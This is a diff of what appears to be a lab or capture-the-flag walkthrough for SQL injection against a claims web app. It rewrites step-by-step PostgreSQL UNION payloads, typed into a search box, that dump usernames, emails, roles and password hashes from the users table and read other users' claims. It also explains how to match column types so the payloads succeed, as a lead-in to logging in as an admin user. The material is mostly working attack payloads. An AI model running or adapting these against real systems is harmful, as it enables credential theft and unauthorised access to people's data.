@@ -91,12 +91,16 @@ The injection point is inside the `LIKE '%…%'` pattern. To break out:
 Test with:
 
 ```
-x' UNION SELECT 1::text,2::text,3::text,4::text,5::text,6::text,7::text,8::text,9::text,10::text,11::text,12::text -- 
+x' UNION SELECT 1::int,2::int,3::int,'4','5',6.0,'7','8',now(),now(),11::int,'12' -- 
 ```
 
 > **Important:** Make sure to include a trailing space after `--`. PostgreSQL requires it for the comment to be valid.
 
-> **Why `::text` casts?** The `UNION` requires compatible column types. Casting integers to `text` avoids type-mismatch errors with the `claims` table's text columns.
+> **Why different type casts?** PostgreSQL requires **exact type matches** in a `UNION`. The first `SELECT *` returns the `claims` table's native types, so the UNION SELECT must match:
+> - **Integer** columns (id, user_id, claim_type_id, reviewed_by): use `::int`
+> - **Float** column (amount): use a decimal like `6.0`
+> - **DateTime** columns (created_at, updated_at): use `now()`
+> - **Text/VARCHAR** columns: use plain string values
 
 If the page loads without a "Query error" flash message, the column count is correct.
 
@@ -105,20 +109,27 @@ If the page loads without a "Query error" flash message, the column count is cor
 Enter the following payload in the search box:
 
 ```
-x' UNION SELECT id::text, username, email, username, role, NULL::text, role, created_at::text, NULL::text, NULL::text, NULL::text, NULL::text FROM users -- 
+x' UNION SELECT id::int, 0::int, 0::int, username, email, 0.0, role, created_at, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
 ```
 
-> **Why so many `::text` casts?** The first `SELECT *` returns the `claims` table's native types (Integer at columns 1, 2, 3, 11; Float at column 6; DateTime at columns 9, 10). PostgreSQL requires **exact type matches** in a `UNION`. Every non-text column in the UNION SELECT must be cast to `text` to match, and text columns must NOT be cast (to avoid text-vs-varchar mismatches).
+> **Why these specific type casts?** The UNION must match the `claims` table's column types exactly:
+> - `id::int` → matches `claims.id` (Integer)
+> - `0::int` → matches `claims.user_id` and `claims.claim_type_id` (Integer)
+> - `username`, `email`, `role` → match VARCHAR/Text columns (no cast needed)
+> - `0.0` → matches `claims.amount` (Float)
+> - `created_at` → matches `claims.created_at` (DateTime)
+> - `NULL::timestamp` → matches DateTime columns
+> - `NULL::int` → matches `claims.reviewed_by` (Integer)
 
 This maps user data to the columns the template renders:
 
 | Template column        | Displays           | `users` value      |
 |------------------------|--------------------|--------------------| 
-| ID (`row[0]`)          | User ID            | `id::text`         |
+| ID (`row[0]`)          | User ID            | `id::int`          |
 | Title (`row[3]`)       | **Username**       | `username`         |
-| Amount (`row[5]`)      | (empty, avoids format error) | `NULL::text` |
+| Amount (`row[5]`)      | `0.0` placeholder  | `0.0`              |
 | Status (`row[6]`)      | **Role**           | `role`             |
-| Submitted (`row[7]`)   | **Created at**     | `created_at::text` |
+| Submitted (`row[7]`)   | **Created at**     | `created_at`       |
 
 Look for a row where the **Title** column shows `oic_admin` and the **Status** column shows `oic`.
 
@@ -127,7 +138,7 @@ Look for a row where the **Title** column shows `oic_admin` and the **Status** c
 The password hash cannot be placed in the Amount position (`row[5]`) because the non-raw template path tries to format it as a float (`"%.2f"|format(row[5])`). Use this separate payload to extract hashes:
 
 ```
-x' UNION SELECT id::text, username, email, password_hash, created_at::text, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text FROM users -- 
+x' UNION SELECT id::int, 0::int, 0::int, password_hash, email, 0.0, role, created_at, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
 ```
 
 This places `password_hash` in the **Title** column (`row[3]`), which renders as plain text.
@@ -137,10 +148,10 @@ This places `password_hash` in the **Title** column (`row[3]`), which renders as
 ### Step 6 — Extract all claims from other users
 
 ```
-x' UNION SELECT id::text, user_id::text, claim_type_id::text, title, description, amount::text, status, additional_details, created_at::text, updated_at::text, reviewed_by::text, review_notes FROM claims WHERE user_id != 1 -- 
+x' UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 -- 
 ```
 
-This returns claims belonging to all other users. Note that integer columns (`id`, `user_id`, `claim_type_id`, `reviewed_by`), the float column (`amount`), and datetime columns (`created_at`, `updated_at`) are all cast to `::text` to match the types expected by the first SELECT.
+This returns claims belonging to all other users. Since both SELECTs query the same `claims` table, no type casts are needed — the column types match automatically.
 
 ### Step 7 — Log in as the OIC user
 
